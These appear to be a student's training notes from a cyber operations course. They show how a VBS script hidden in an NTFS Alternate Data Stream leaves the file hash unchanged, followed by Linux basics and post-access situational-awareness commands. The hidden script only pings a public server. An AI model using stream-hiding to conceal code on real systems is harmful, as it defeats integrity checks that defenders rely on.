Reply from 8.8.8.8: bytes=32 time=6ms TTL 113
Reply from 8.8.8.8: bytes=32 time=5ms TTL 113
Reply from 8.8.8.8: bytes=32 time=5ms TTL 113

Ping statistics for 8.8.8.8:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip in milli-seconds:
    Minimum = 5ms, Maximum = 6ms, Average = 5 master

C:\Program Files>
Output of VBS code is a simple ping to Google. Not so malicious after all…​


3. Does file hash change if we alter the Alternate Data Stream?
C:\Program Files>cd C:\windows\system32 

C:\windows\system32>certutil -hashfile test.txt MD5 
MD5 hash of test.txt:
cb73eeca4f440ee9c6e16ad3cfddb10a
CertUtil: -hashfile command completed successfully.

C:\windows\system32>notepad test.txt:secret.vbs 
_enter some extra code or remove some code_

C:\windows\system32>more < test.txt:secret.vbs 
Dim oShell
Set oShell = Wscript.CreateObject ("Wscript.Shell")
oShell.run "cmd /k CD C:\Program Files & ping 8.8.8.8" ,1 , true
words and such

C:\windows\system32>certutil -hashfile test.txt MD5 
MD5 hash of test.txt:
cb73eeca4f440ee9c6e16ad3cfddb10a
CertUtil: -hashfile command completed successfully.
Change directories to C:\windows\system32 where test.txt is.
Add or remove some code to :secret.vbs with notepad.
Verify changes to ADS content with more.
Runs certutil again to show the hash hasn’t changed.
Changing the ADS content of a file does not affect the file hash. Only changing the actual content on the main stream ($DATA) will result in a change in the file hash. This is important because an operator cannot assume a file was not tampered with just because the file hash has not changed.

###############################END###############################
##############################################################END OF DAY 2##############################################################
##############################################################DAY 3##############################################################
###############################LINUX ESSENTIALS###############################
###############################TLO###############################
Terminal Learning Objectives
1. Explain the Purpose of Understanding the Linux Environment
2. Identify Commands to Enumerate Processes
3. Identify Methods of Automation and Logic
4. Identify Critical Locations in the Linux File System
5. Discuss String Manipulation Techniques to Identify Key Information
6. Complete Linux Essentials CTFd Challenges PE
###############################END###############################
###############################COMMANDS###############################
1. Commands, Arguments, and Help
BASH, much like PowerShell, does 4 things:

Execute Commands with or without arguments

Redirect output from commands to a variety of locations (covered later)

Parse text(string) input and output into lines formatted as the user finds useful

Accept scripts to automate execution of all the above tasks

CLI will be synonymous with the terminal or command line from here on out.


1.1 Commands
As previously stated, terminals are interfaces used to run commands on the system. It’s common to find not only all the features of a GUI program in it’s CLI counterpart, but most of the time you actually gain additional functionality as well.

Running an executable in a bash terminal
student:~$ pwd 
/home/student 
pwd (print working directory) command.
the output of the command, returned on a new line.
"Newline" is a character that is commonly used to represent the beginning of a new line, or end of an old one. While common, not all commands return their results with a newline character added to the end (\n). When using methodologies such as hashing, these invisible blank newline characters should be taken into account.


1.1.1 Situational Awareness
After first obtaining access to a system an operator must gather as much information about their environment as possible, this is referred to as situational awareness. pwd is just one command of many on Linux which can provide us some insight.

Other commands to help gain situational awareness:

hostname or uname -a displays the name of the host you are currently on.

whoami shows the user you are currently logged in as (useful after gaining access through service exploitation).

w or who shows who else is logged in.

ip addr or ifconfig displays network interfaces and configured IP addresses.

ip neigh or arp displays MAC addresses of devices observed on the network.

ip route or route shows where packets will be routed for a particular destination address.

ss or netstat will show network connections, with the appropriate flags will show listening ports

nft list tables or iptables -L to view firewall rules.

sudo -l displays commands the user may run with elevated permissions.

Depending on the age and distribution of Linux some commands may not be installed or require privilege escalation through sudo to run.


1.2 Arguments
Almost all commands you ever come across will take additional parameters or arguments that modify the functionality of the base command. In some cases, arguments are even required and the command will not function without it.

Running a Command with and without an Argument
student:~$ cd / 
student:~$ ls 
bin   dev  home        initrd.img.old  lib64       media  opt   root  sbin  srv  tmp  var      vmlinuz.old
boot  etc  initrd.img  lib             lost+found  mnt    proc  run   snap  sys  usr  vmlinuz
student:~$ ls -l 
drwxr-xr-x   2 root root  4096 Feb  4  2020 bin
drwxr-xr-x   3 root root  4096 Feb  4  2020 boot
drwxr-xr-x  19 root root  3840 Jan 23 12:29 dev
drwxr-xr-x 117 root root  4096 Feb 12 16:49 etc
drwxr-xr-x   4 root root  4096 Jan 23 12:25 home
_truncated_
cd / required for demo.
ls with no arguments.
ls -l changes the output to long list format.


1.3 Help
Terminals were created in the age before the internet, so when they are installed, the documentation is included.

Running a command with an argument to get help
student:~$ ls --help 
Usage: ls [OPTION]... [FILE]...
List information about the FILEs (the current directory by default).
Sort entries alphabetically if none of -cftuvSUX nor --sort is specified.

Mandatory arguments to long options are mandatory for short options too.
  -a, --all                  do not ignore entries starting with .
  -A, --almost-all           do not list implied . and ..
      --author               with -l, print the author of each file
  -b, --escape               print C-style escapes for nongraphic characters
      --block-size=SIZE      with -l, scale sizes by SIZE when printing them;
                               e.g., '--block-size=M'; see SIZE format below
  -B, --ignore-backups       do not list implied entries ending with ~
  -c                         with -lt: sort by, and show, ctime (time of last
                               modification of file status information);
                               with -l: show ctime and sort by name;
                               otherwise: sort by ctime, newest first
  -C                         list entries by columns
_truncated_
--help is an generic argument that should give a simple help document for a command.




Linux also provides access to man (manual) pages for the majority of its commands. Man pages at a minimum do the following:

Describe the command

List all of its arguments

The man pages for most commands are available online too. Man page for the LS Command
Running the man command to view the man page for ls
student:~$ man ls 
LS(1)                                           User Commands                                          LS(1)

NAME
       ls - list directory contents

SYNOPSIS
       ls [OPTION]... [FILE]...

DESCRIPTION
       List  information about the FILEs (the current directory by default).  Sort entries alphabetically if
       none of -cftuvSUX nor --sort is specified.

       Mandatory arguments to long options are mandatory for short options too.

       -a, --all
              do not ignore entries starting with .
_truncated_
The man command with ls as an argument.


1.4 Variables and Command substitution
Variables are a string of characters with an assigned value. They are used when automating tasks to reduce the amount of time needed to do something. Variables as a concept are easy to explain, but their application is dependent on that task that needs to be done.

BASH Variables are always accessed with $ then the variable name, but they are created without a $ character.
Assigning a Single Value to a Variable
student:~$ echo $a 
                   
student:~$ a="100" 
student:~$ echo $a 
100 
echo the value of the variable a. Notice that it has no value.
Nothing is returned.
Setting the value of a equals to 100.
echo the value of a.
Notice that the new value is 100.


Variables can also be assigned the output of a command using a technique called Command substitution. Command substitution is done with $(command) instead of the traditional $.

Command Substitution in Bash
student:~$ directories=$(ls /) 
student:~$ echo $directories 
bin   dev  home        initrd.img.old  lib64       media  opt   root  sbin  srv  tmp  var      vmlinuz.old
boot  etc  initrd.img  lib             lost+found  mnt    proc  run   snap  sys  usr  vmlinuz
Assign the variable directories to the output of the ls / command. Note the $().
Execute the echo command the contents of the variable directories.


1.5 Redirection
Success and Failure Output from commands by default is sent to the terminal, but it can be redirected to other locations as well. Output from commands are assigned to a stream. There are three types of streams by default:

standard input 0 ←--- the default for a command arguments

standard output 1 ←--- the default for successful command output

standard error 2 ←--- the default for failed commands or errors

Redirection is done with the > character and a file name or a numbered stream.

Using a 1> redirect output to a file in bash
student:~$ directories=$(ls /) 
workstation21:$ echo $directories 1> thisisanewfile 
workstation21:$ cat thisisanewfile 
Creates the directories variable if you haven’t done so already.
Send the standard output from the $directories variable into a file named thisisanewfile.
Read the contents of thisisanewfile.


Using a 2> redirect errors to a location in bash
student:~$ ls bacon 
ls: cannot access 'bacon': No such file or directory

workstation21:$ ls bacon 2> errorfile 
workstation21:$ cat errorfile 
ls: cannot access 'bacon': No such file or directory
Try to list the contents of a directory that does not exist.
Send the standard error from the command to errorfile.
cat errorfile.


Append to a File using the Redirection Operator ( >> ) Redirection allows you to capture the output from a command and send it as input to another command or file.

The >> redirection operator appends the output to a given file.

1.6 Piping
Piping redirects standardoutput or 1 to standardinput or 0 to be processed as an argument to another command using the | character.

Using piping filter command output using grep
student:~$ ls -Rlisa /etc | grep syslog 
1378 4 -rw-r--r--   1 root root 1358 Jan 30  2018 rsyslog.conf
1379 4 drwxr-xr-x   2 root root 4096 Feb  2 14:28 rsyslog.d
566  4 -rw-r--r--   1 root root 1550 Apr 24  2018 usr.sbin.rsyslogd
527  0 lrwxrwxrwx   1 root root   33 Jan 31  2020 usr.sbin.rsyslogd -> /etc/apparmor.d/usr.sbin.rsyslogd
535  0 -rw-r--r--   1 root root    0 Jan 31  2020 usr.sbin.rsyslogd
768  4 -rw-r--r--   1 root root  124 Jan 14  2018 rsyslog
958  4 -rwxr-xr-x   1 root root 2864 Jan 14  2018 rsyslog
1043 4 -rw-r--r--   1 root root  804 Jan 14  2018 rsyslog
1054 4 -rw-r--r--   1 root root  501 Jan 14  2018 rsyslog
ls: cannot open directory '/etc/polkit-1/localauthority': Permission denied 
Execute ls with arguments, then send the output to grep command using a pipe | to filter for the string syslog.
Standard error saying Permissions denied.
To remove all errors from your output, consider utilizing standard error redirection. ls -Rlisa /etc 2> /dev/null | grep syslog
###############################END###############################
###############################BLANK###############################
. Automation and Logic
The primary benefit of terminals is the automation of repetitive tasks and processing logical statements. These statements and loops execute automatically using pre-programmed conditions that control how and even if they execute. They are invaluable to understand and their usefulness is limited to ones imagination and patience.

If Statements, For Loops, and While Loops don’t have good man page entries because they are built into the bash man page. Highly recommend using online resources.
2.1 For Loops
For Loops go by many names such as Counting Loops and Interactive Loops, but they all do the same thing - execute a command or commands multiple times with a changing variable as an argument. A complete for loop will have the following:

a collection of objects assigned to a variable

a variable that represents the value in the collection correctly being worked on

a command or commands that will execute with each value in the collection of variables

Making a Collection of objects
student:~$ objects=$(ls -d /etc/*) 
student:~$ echo $objects 
/etc/NetworkManager /etc/PackageKit /etc/UPower /etc/X11 /etc/acpi /etc/adduser.conf /etc/alternatives /etc/anacrontab /etc/apg.conf /etc/apm /etc/apparmor /etc/apparmor.d /etc/apport /etc/apt /etc/at.deny /etc/bash.bashrc /etc/bash_completion /etc/bash_completion.d /etc/bindresvport.blacklist /etc/binfmt.d /etc/byobu /etc/ca-certificates /etc/

_truncated_
Using command substitution to make a variable containing all the files and folders in /etc.
Reading the content of the variable $objects. Warning it is ugly.


Making a For Loop to iterate on Objects in the collection of Objects
student:~$ for item in $objects; do echo $item; done 
/etc/NetworkManager
/etc/PackageKit
/etc/UPower
/etc/X11
/etc/acpi
/etc/adduser.conf
/etc/alternatives
/etc/anacrontab
/etc/apg.conf
/etc/apm
_truncated_
For each item in located in the objects variable, echo the value of item as the loop executes.
The $item variable is will contain each entry in $objects delimited by a space as the loop executes.
For Loops TLDP



2.2 If Statements
If statements are logical expressions that compare objects against various tests to see if they evaluate as true or false. They are understood in a sentence form like this:

If this comparison is true, then do this

or

Else If this comparison is true, then do this

or

If nothing is true, do this

Making an If Statement to evaluate a series of objects Copy each line one at a time
student:~$ for object in $objects; \ 
do if [ -d $object ]; then echo "$object is a directory"; \ 
else echo "$object is file" ; \ 
fi ; \ 
done 

/etc/X11 is a directory
/etc/acpi is a directory
/etc/adduser.conf is a file
/etc/alternatives is a directory
/etc/anacrontab is a file
/etc/apg.conf is a file
/etc/apm is a directory
/etc/apparmor is a directory

student:~$ for object in $objects; do if [ -d $object ]; then echo "$object is a directory"; else echo "$object is a file" ; fi ; done 
The beginning of the for loop like in section 2.1.
if $object is a directory AND it exists, then run echo "$object is a directory".
else echo "$object is a file".
ends the if statements.
ends the for loop started in 1.
One liner version of the if statement.


One Line For Loop and If Statement for the student’s notes
for object in $objects; do if [ -d $object ]; then echo "$object is a directory"; else echo "$object is a file" ; fi ; done
If Statements TLDP

2.3 While Loops
While statements execute a command or series of commands while a condition is true. Unlike for loops which will eventually run out of objects, While Loops will run forever if their condition never evaluates as false. While loops are great for making things run for a specific amount of time instead of a exact amount of iterations. They are understood in sentence form as follows:

While this condition is true, do this thing or series of things, then re-evaluate the condition to see if it is false. Repeat until condition is false.



Making an Basic While Loop
while [ 1 -eq 1 ]; do echo "To Infinity and Beyond!"; done 
While 1 equals 1, run the command echo ""To Infinity and Beyond!".
Yes, this script will run forever.
This While loop will run forever, unless the condition is re-evaluated as false.


Practical While Loop Example
curtime=$(date +"%s") 
echo $curtime

exittime=$(expr $curtime + 3) 
echo $exittime

while [ $exittime -ge $curtime ]; do echo "To Infinity and Beyond?" ; curtime=$(date +"%s") ; done 
To Infinity and Beyond?
To Infinity and Beyond?
To Infinity and Beyond?
To Infinity and Beyond?
_Truncated_ #It goes for three seconds
Use command substitution to set the value of curtime equal to the current time in Epoch time. "%s" = in seconds
Use command substitution to set the value of exittime equal to 3 seconds in the future Epoch Time.
While exittime is greater than curtime, do echo "To Infinity and Beyond?", then update the curtime variable and check if exittime is still greater or equal to curtime.

###############################END###############################
###############################BLANK###############################
3. Linux Filesystems
A file system is how a computer stores, categorizes, and retrieves data from physical media devices for use in various applications on the system.

There are multiple types of file systems, but they all follow a common layout described below:

Physical Media contains

A Partition that is a formatted section of memory, which contains

A File System mounted on a drive, which contains

A Hierarchical Format of Objects and their supporting Data and Metadata

File systems are a broad topic that range from understand hexadecimal layouts of hard drives to Forensics Techniques to reassemble deleted files. However, the important take away for this course is the understanding of what is located where and what a user can do with it on a Linux Filesystem



3.1 Linux Filesystem Hierarchy
Every *Nix system from Ubuntu to Debian has a defined file system layout which is known as the Linux FSH (File System Hierarchy). It is a standard which defines the directory structure on all Linux distributions. What does that mean? Well, by default it defines:

The root directory of the file system /

Everything starts from this directory. Think of it as the doorway to the Linux Filesystem

Essential user commands in /bin

Contains commands like ls and echo which every user can use.

User Directories in /home

Contains directories for every non-root user on the system (with a home directory and login shell)

Host specific system configurations in /etc

Stands for everything configurable

Contains network configurations, system services(daemons), firewall configurations, etc.

Variable data files in /var

Contains all of the system logs by default

Linux Filesystem Hierarchy Standard Wiki

Linux Filesystem Hierarchy Standard Detailed



3.2 Files and Folders
In a file system, there are two types of objects - files and folders. Folders are a container for files, whilst files are containers for data. Everything without exception falls into one of those two categories.

Showing / directories
student@linux-opstation-kspt:~$ cd / 
student@linux-opstation-kspt:/$ 
student@linux-opstation-kspt:/$ls -l $PWD/* 
drwxr-xr-x   2 root root  4096 Feb  4  2020 /bin
drwxr-xr-x   3 root root  4096 Feb  4  2020 /boot
drwxr-xr-x  19 root root  3840 Jan 23 12:29 /dev
drwxr-xr-x 117 root root  4096 Feb 12 16:49 /etc
drwxr-xr-x   4 root root  4096 Jan 23 12:25 /home
execute the command cd into the root directory of /.
The directory changed to /.
Execute ls in long list format with absolute path.


Showing files in /bin
student@linux-opstation-kspt:/$ cd /bin 

student@linux-opstation-kspt:/bin$ ls -ld $PWD/* 
-rwxr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash
-rwxr-xr-x 1 root root  716464 Mar 12  2018 /bin/btrfs

student@linux-opstation-kspt:/bin$ ls -l 
-rwxr-xr-x 1 root root 1113504 Jun  6  2019 bash
-rwxr-xr-x 1 root root  716464 Mar 12  2018 btrfs
-rwxr-xr-x 1 root root  375952 Mar 12  2018 btrfs-debug-tree
Change directory to /bin.
Execute ls in long list format with absolute paths.
Execute ls in long list format with relative paths.


Remember that there are only two types of objects in Linux - files and folders. Folders can’t be read, but files can. Granted, not every file is human readable. In most computers today, files have subtypes defined by their file signature typically located in the first few bytes of a file. The file signature defines how the operating system will attempt to use the file.

Reading a "file" in /bin
student@linux-opstation-kspt:/bin$ cat ls | head -n 1 
ELF>PX@▒@8      @@@▒888▒ _truncated_ 

student@linux-opstation-kspt:/bin$ xxd ls | head -n 2
00000000: 7f45 4c46 0201 0100 0000 0000 0000 0000  .ELF............ 
00000010: 0300 3e00 0100 0000 5058 0000 0000 0000  ..>.....PX......
Execute cat on ls, then send its standard output to the head command and trim output to display a single row.
Aside from the first few characters, that isn’t readable.
Execute xxd on ls, then send its standard output to the head command and trim output to display to the first two rows.
Look at that file signature! This file signature of 7f45 4c46 stands for Linux Executable Linked file format unique to Linux.
File Signature Wikipedia



3.3 Linux Users
Users in Linux systems are defined by an ascending numerical value called a UID. The uid value uniquely identifies a user and is contained in the /etc/passwd file along with an associated username. Every user on a Linux system and has an associated value in /etc/passwd.

Identify what Username you are whoami
student@linux-opstation-kspt:/bin$ whoami 
student 
Execute the whoami command.
The answer to who I am.


Identify what your uid value is with id
student@linux-opstation-kspt:/bin$ id 
uid=1001(student) gid=1001(student) groups=1001(student),27(sudo) 
Execute the id command.
All of my associated ids?
1001 is the UID of student, but its also the GID because it is assigned to the student group.


Looking at who I am in the /etc/passwd file with cat
student@linux-opstation-kspt:/bin$ cat /etc/passwd | grep student 
student:x:1001:1001::/home/student:/bin/bash 
 (1)   (2) (3) (4) (5)   (6)          (7)
cmd line: Execute cat /etc/passwd and pipe it to grep to filter on student.
cmd output: Student entry in the /etc/passwd file.
Sections of output lines
Username
Password. An x character indicates that an encrypted password is stored in /etc/shadow file.
UID Value
GUID Value
User ID Info (GECOS). The comment field
Homeome Directory.
Command/Shell /bin/bash


3.4 Linux Groups
Groups in Linux define a collection of Users and are defined by an ascending GID value. The gid value uniquely identifies a group and is contained in the /etc/group and its associated group name.

Looking at who I am in the /etc/group file with cat
student@linux-opstation-kspt:/bin$ cat /etc/group | grep student 
sudo:x:27:ubuntu,student 
student:x:1001: 
Execute cat /etc/group and pipe it to grep to filter on student.
Shows the sudo group, its gid value, its two members student and ubuntu.
Shows the student group, its gid value, and no additional members.
By default every user is a member of their own group; therefore, it will not show in /etc/groups. /etc/groups/ shows what is called supplementary group membership


3.5 Permissions
Access to objects in Linux by is controlled via strict file permissions metadata. It is formatted as:

U The object’s User/Owner

G The object’s owning Group

O Any subject that is not the owning user or group, AKA: "Others"

Each U.G.O permission group has three corresponding permissions of Read, Write, and Execute. Any combination of permissions can be applied to any permissions group. These permissions also have numeric representations of 4, 2, and 1. Permissions when represented by letters, as in rwx, are referred to as Relative, and permissions when represented by numbers, as in 421 are referred to as Octal.

It’s also important to understand that file permissions do not overrule directory permissions. If a user does not have read rights to a directory, it also cannot read any of its files even if the file’s permissions allow it

Table 1. Linux Permissions broken out
Perm	Relative	Octal	On a File	On a Directory
read

r

4

Read the contents of the file

List the contents of the directory

write

w

2

Write content into a file

Create/delete in the directory

exe

x

1

Run the file as an executable

Move into the directory



Showing Linux Permissions with ls -lisa
student@linux-opstation-kspt:/bin$ ls -lisa /bin/dd 
student@linux-opstation-kspt:/bin$ 130341 76 -rwx r-x r-x 1 root root 76000 Jan 18  2018 /bin/dd
                                             (2)  (3) (4)   (5)   (6)
Showing permissions.
The Owner has Read, Write, and Execute permissions.
The Group has Read and Execute permissions.
Anyone who is not the User/Owner or belonging to the Group has Read and Execute permissions.
The file’s Owner.
The files' Group.


File and Folder Permissions Demo
student@linux-opstation-kspt:/home/student$ sudo su
root@linux-opstation-kspt:/home/student$  mkdir testdir
root@linux-opstation-kspt:/home/student$  chmod 750 testdir
root@linux-opstation-kspt:/home/student$  echo "Can you read me?" > testdir/file
root@linux-opstation-kspt:/home/student$  ls -lisa testdir/
1020551 4 drwxr-x---  2 root   root   4096 Feb 17 19:00 .
1016881 4 drwxr-xr-x 24 student student 4096 Feb 17 18:59 ..
1022450 4 -rw-r--r--  1 root   root     16 Feb 17 19:00 canttouchthis

root@linux-opstation-kspt:/home/student$  exit
student@linux-opstation-kspt:/home/student$ cat testdir/canttouchthis
cat: testtest/canyouread: Permission denied
Change to the root user.
make a directory named testdir.
change the permissions on the directory to 750 or RWX,R-X,---.
Echo some text into a file in the created directory.
Show the permissions of the Directory and the file. . represents the directories permissions.
Exit root.
Try to cat the file as student and get Permission denied.


3.5.1 Special Permissions : Sticky Bit
If a user has write access to a directory, they can delete any file from it. That may cause problems though in some directories like /var/tmp. To address this Linux has what is known as the sticky bit. The sticky bit removes the ability to delete files unless the user attempting is the owner of the file.

The root account can still delete the file if it wants to.


3.5.2 Special Permissions : SUID and SGID
When an executable is ran in Linux, it runs with the permissions of the user who started it. However, SUID and SGID change that to force the executable to run as the owning user or group. These permissions are represented as s in the User or Group field of ls- l.

SUID and SGID Demo
student@linux-opstation-kspt:~$ ls -l /bin/ping 
-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping 
Execute ls -l on /bin/ping.
Notice the s in the users field? What permissions does this executable effectively have?

###############################END###############################
###############################BLANK###############################
4. String Manipulation
In Linux all output is some kind of text, regardless of whether it was meant to be read by humans or not. You could scroll and use your finger to find data, or you can use one of pattern matching or text manipulation tools to make life easier.

4.1 Grep
Grep is a program that searches data given to it from standard input for patterns of strings specified with regular expressions. Grep is invaluable in Linux because most of the time it is to only way to quickly filter output to find exactly what is needed.

grep uses a generic wildcard regular expression match by default. It accepts custom regular expressions too with arguments.
Use grep to filter standard output from another command
student@linux-opstation-kspt:~$ ls -Rlisa /etc | grep password 
 1137 4 -rw-r--r--   1 root root 1440 Jan 31  2020 common-password
 1156 4 -rw-r--r--   1 root root 1160 Oct  9  2018 gdm-password
ls: cannot open directory '/etc/polkit-1/localauthority': Permission denied 
ls: cannot open directory '/etc/ssl/private': Permission denied
ls: cannot open directory '/etc/sudoers.d': Permission denied
Execute ls -Rlisa then send its standard out to grep to filter for the string password.


Use grep to search through a directory for text
student@linux-opstation-kspt:~$ grep -R 'network' /etc/ 
Execute grep -R 'network' /etc/ then send it’s standard out to grep to filter for the string network.
The -R is recursive.
Grep is a command that looks for a string of characters then presents the results to your screen. Grep is commonly used in conjunction with piping outputs from previous commands. But can also be used as a standalone command, with it’s own options/switches.


4.2 Awk
awk is yet another important string manipulation tool. Unlike grep which searches for strings of text, awk allows you to reformat or select sections of text based on delimiters on the fly. Awk is commonly used to create tabular data sets from command output in Bash. However, it is a very flexible tool and its functionality does not end there.

Reformat output from a command to create a comma delimited file with awk
student@linux-opstation-kspt:~$ ls -l /etc 
drwxr-xr-x  7 root root       4096 Feb  4  2020 NetworkManager
drwxr-xr-x  2 root root       4096 Feb  4  2020 PackageKit
drwxr-xr-x  2 root root       4096 Feb  4  2020 UPower
_truncated_

student@linux-opstation-kspt:~$ ls -l /etc | awk -F " " '{print$3","$4","$9}' > files.csv 
student@linux-opstation-kspt:~$ cat files.csv
root,root,NetworkManager
root,root,PackageKit
root,root,UPower
_truncated_
The output from ls -l is verbose, maybe all of that information isn’t needed?
Lets send the output from ls -l into awk, then set the delimiter to blank space, then tell it to print fields $3,$4,$9, finally send them to a csv file.


Crate a variable of all the news articles on https://dailymail.co.uk`
student@linux-opstation-kspt:~$ articles=$(curl -L https://www.dailymail.co.uk/ushome/index.html --output - | grep itemprop | grep href | awk -F "\"" '{print$4}'|  awk -F "/" '{print$4}')

student@linux-opstation-kspt:~$ for article in $articles; do echo $article; done
Rush-Limbaugh-dies-aged-70-lung-cancer-battle.html
Facebook-BANS-Australians-sharing-news-war-publishers.html
Congress-holds-hearing-reparations-slavery-time-BLM-protests-rocked-nation.html
Kendall-Jenner-accused-cultural-appropriation-launching-tequila-brand.html
MGM-Resorts-resume-24-7-operations-Mandalay-Bay-Park-MGM-Mirage-resorts-Las-Vegas.html
_truncated_
Perform a http GET request and filter all the HTML to get to the specific articles by grepping on itemprop, then grep on href, next use awk to cut output into fields separated by \ characters and select column 4, finally cut output into fields separated by / characters and select column 4.
Read the variable articles with a for loop.
What you can do with these commands is limited by your imagination and knowledge. Go out and learn new ways to use them. Have fun!
4.3 Sed
Sed is yet another string manipulation tool, but it edits text instead of filtering or formatting it like the other two. Sed is special because it edits text as it is sent to standard output. It is known as a stream editor. Text edited from sed can also be saved assuming the user executing it has the right permissions.

Use sed to change standard out from the cat
student@linux-opstation-kspt:~$ cat /etc/passwd | grep root 
root:x:0:0:root:/root:/bin/bash

student@linux-opstation-kspt:~$ cat /etc/passwd | grep root | sed s/root/bacon/g 
bacon:x:0:0:bacon:/bacon:/bin/bash
Execute cat on /etc/passwd then filter the output with grep to filter for root.
Using sed to change standard any standard input that matches root to bacon, then send the modified output to the screen.
Using sed to clean up the output from the Dailymail Variable in section 4.2
student@linux-opstation-kspt:~$ for article in $articles; do echo $article; done 
Rush-Limbaugh-dies-aged-70-lung-cancer-battle.html
Facebook-BANS-Australians-sharing-news-war-publishers.html
Congress-holds-hearing-reparations-slavery-time-BLM-protests-rocked-nation.html

for article in $articles; do echo $article |sed -e s/\.html//g -e s/\-/" "/g ; done  
Rush Limbaugh dies aged 70 lung cancer battle
Facebook BANS Australians sharing news war publishers
Police 7 shot near transit station north Philadelphia
The original output described in 4.2. It is messy and could be cleaned up a bit.
Using sed to replace standard input that matches .html with nothing.
Using sed to replace standard input from sed that matches the - (dash) character with a space.
These are very limited examples, designed to show you the basics. With either Sed or Awk, the only limit is your imagination.


4.4 Regular Expressions
Regular expressions, or regex, are a pattern matching language developed in the 1980s with the first use of the Unix operating system. Regex filters on patterns strings that may match multiple permutations. Most internet search engines, online shopping, and really any place there is a search button uses them too.



Showing how regular expressions can match on multiple permutations of strings
student@linux-opstation-kspt:~$ echo -e "Handel\nHändel\nHaendel" > regexfile 
student@linux-opstation-kspt:~$ grep -P "H(ä|ae?)ndel" regexfile >  
Handel
Händel
Haendel
Create a file with 3 similar names in it and save it as regexfile in the current directory.
Use grep with -P to specify Perl regular expressions and look for :
H,ä or a, e is optional, ndel.
Handel Example Reference



Showing how regular expressions can match on multiple permutations of strings in files that are too large to search manually
student@linux-opstation-kspt:~$ cat results.txt 
111-715-255643
(9279815)92-3599127
466-33836614-273
_truncated_

student@linux-opstation-kspt:~$ grep -P '\b\d{3}-\d{2}-\d{4}\b' results.txt
629-75-1985
386-67-7872
478-71-4964

student@linux-opstation-kspt:~$ grep -P '\(\d{3}\)\d{3}-\d{4}\b' results.txt
(267)874-4532
(446)146-8923
(548)985-5415
(199)363-3617
Attempting to cat the a large file isn’t very helpful.
Execute grep to search for the following pattern : nnn-nn-nnnn.
Execute grep to search for the following pattern : (nnn)nnn-nnnn.

###############################END###############################
##############################################################END OF DAY 3##############################################################











###############################QUESTIONS###############################



###############################BLANK###############################
###############################END###############################

###############################BLANK###############################
###############################END###############################





##############################################################DAY 1##############################################################
##############################################################END OF DAY 1##############################################################
